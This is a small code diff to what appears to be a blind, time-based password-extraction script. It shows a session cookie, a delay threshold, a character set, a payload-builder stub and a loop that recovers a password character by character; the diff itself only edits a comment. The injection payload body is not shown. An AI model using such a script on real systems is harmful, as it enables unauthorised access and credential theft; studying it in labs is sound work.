@@ -5,7 +5,7 @@ SESSION = "LVAOuVrcU3Vx94kRaqfh2iyRacDlIiHiS"               # keep this fresh
 DELAY = 5
 THRESHOLD = DELAY - 0.8                                 # timing slack
 CHARSET = string.ascii_lowercase + string.digits
-PW_LEN = 20                                             # you said it's known
+PW_LEN = 20                                             # Depends on length of password
 
 def make_payload(pos, ch):
     raw = (
@@ -36,5 +36,6 @@ for pos in range(1, PW_LEN + 1):
     if not found:
         print("[*] No match at pos", pos, "(refresh session cookie?)")
         break
+
 
 print("\n[✓] Password:", password)
